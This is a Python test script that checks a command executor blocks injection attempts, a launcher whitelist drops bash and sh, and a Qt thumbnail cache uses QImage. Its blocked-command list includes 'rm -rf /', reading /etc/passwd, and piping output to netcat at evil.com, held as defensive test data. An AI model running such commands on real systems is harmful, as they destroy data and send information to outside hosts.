#!/usr/bin/env python3
"""Test security fixes to ensure vulnerabilities are patched."""

import sys
from secure_command_executor import SecureCommandExecutor


def test_command_injection_blocked():
    """Test that command injection attempts are blocked."""
    executor = SecureCommandExecutor()
    
    # Test cases that should be BLOCKED
    dangerous_commands = [
        "rm -rf /",  # Not in whitelist
        "bash -c 'evil command'",  # bash not allowed
        "sh script.sh",  # sh not allowed
        "echo test; rm -rf /",  # Shell metacharacters
        "echo test && cat /etc/passwd",  # Command chaining
        "echo test | nc evil.com 1234",  # Pipe to netcat
        "echo $(whoami)",  # Command substitution
        "echo `hostname`",  # Backtick substitution
        "ls ../../../../../../etc/passwd",  # Path traversal
        "find / -name passwd",  # Accessing root
    ]
    
    print("Testing command injection prevention...")
    blocked_count = 0
    
    for cmd in dangerous_commands:
        try:
            result = executor.execute(cmd, timeout=1)
            print(f"❌ FAILED: Command was NOT blocked: {cmd}")
            print(f"   Result: {result}")
        except ValueError as e:
            print(f"✅ BLOCKED: {cmd[:50]}...")
            blocked_count += 1
        except Exception as e:
            print(f"❌ Unexpected error for: {cmd}")
            print(f"   Error: {e}")
    
    print(f"\nBlocked {blocked_count}/{len(dangerous_commands)} dangerous commands")
    
    # Test cases that should be ALLOWED
    safe_commands = [
        "echo test",  # Simple echo
        "ws -sg",  # Workspace command
        "pwd",  # Current directory
        "ls -la",  # List with allowed flags
    ]
    
    print("\nTesting safe command execution...")
    allowed_count = 0
    
    for cmd in safe_commands:
        try:
            # Note: ws command would fail without proper environment
            # but should pass validation
            if cmd.startswith("ws"):
                result = executor.execute(cmd, timeout=1, allow_workspace_function=True)
            else:
                result = executor.execute(cmd, timeout=1)
            print(f"✅ ALLOWED: {cmd}")
            allowed_count += 1
        except ValueError as e:
            print(f"❌ FAILED: Safe command was blocked: {cmd}")
            print(f"   Error: {e}")
        except Exception as e:
            # ws commands might fail due to missing environment
            if "ws" in cmd:
                print(f"✅ ALLOWED: {cmd} (validation passed, execution failed as expected)")
                allowed_count += 1
            else:
                print(f"⚠️  Warning for: {cmd}")
                print(f"   Error: {e}")
    
    print(f"\nAllowed {allowed_count}/{len(safe_commands)} safe commands")
    
    # Summary
    if blocked_count == len(dangerous_commands):
        print("\n🎉 SUCCESS: All dangerous commands were blocked!")
        return True
    else:
        print(f"\n⚠️  WARNING: Only {blocked_count}/{len(dangerous_commands)} dangerous commands blocked")
        return False


def test_bash_removed_from_whitelist():
    """Test that bash/sh are removed from launcher whitelist."""
    print("\nTesting launcher whitelist...")
    
    # Import would fail without PySide6, so we'll check the file content
    import re
    
    with open("launcher_manager.py", "r") as f:
        content = f.read()
    
    # Check ALLOWED_COMMANDS doesn't contain bash or sh
    allowed_section = re.search(r'ALLOWED_COMMANDS = \{([^}]+)\}', content, re.DOTALL)
    if allowed_section:
        commands = allowed_section.group(1)
        has_bash = '"bash"' in commands or "'bash'" in commands
        has_sh = '"sh"' in commands or "'sh'" in commands
        
        if not has_bash and not has_sh:
            print("✅ bash and sh successfully removed from whitelist")
            return True
        else:
            print("❌ FAILED: bash or sh still in whitelist!")
            if has_bash:
                print("   Found: bash")
            if has_sh:
                print("   Found: sh")
            return False
    else:
        print("⚠️  Could not find ALLOWED_COMMANDS section")
        return False


def test_thread_safety_fix():
    """Test that QPixmap caching was fixed to use QImage."""
    print("\nTesting thread safety fix...")
    
    with open("shot_item_model.py", "r") as f:
        content = f.read()
    
    # Check for QImage usage instead of QPixmap in cache
    has_qimage_cache = "_thumbnail_cache: Dict[str, QImage]" in content
    has_qimage_import = "QImage" in content
    has_conversion = "QPixmap.fromImage" in content
    
    if has_qimage_cache and has_qimage_import and has_conversion:
        print("✅ Thread-safe QImage caching implemented")
        return True
    else:
        print("❌ Thread safety fix incomplete:")
        if not has_qimage_cache:
            print("   Missing: QImage cache declaration")
        if not has_qimage_import:
            print("   Missing: QImage import")
        if not has_conversion:
            print("   Missing: QPixmap.fromImage conversion")
        return False


if __name__ == "__main__":
    print("=" * 60)
    print("SECURITY FIXES VALIDATION TEST")
    print("=" * 60)
    
    results = []
    
    # Run tests
    results.append(("Command Injection Prevention", test_command_injection_blocked()))
    results.append(("bash/sh Whitelist Removal", test_bash_removed_from_whitelist()))
    results.append(("Thread Safety Fix", test_thread_safety_fix()))
    
    # Print summary
    print("\n" + "=" * 60)
    print("TEST SUMMARY")
    print("=" * 60)
    
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for name, result in results:
        status = "✅ PASSED" if result else "❌ FAILED"
        print(f"{name}: {status}")
    
    print(f"\nOverall: {passed}/{total} tests passed")
    
    if passed == total:
        print("\n🎉 All security fixes validated successfully!")
        sys.exit(0)
    else:
        print(f"\n⚠️  {total - passed} test(s) failed. Security fixes may be incomplete.")
        sys.exit(1)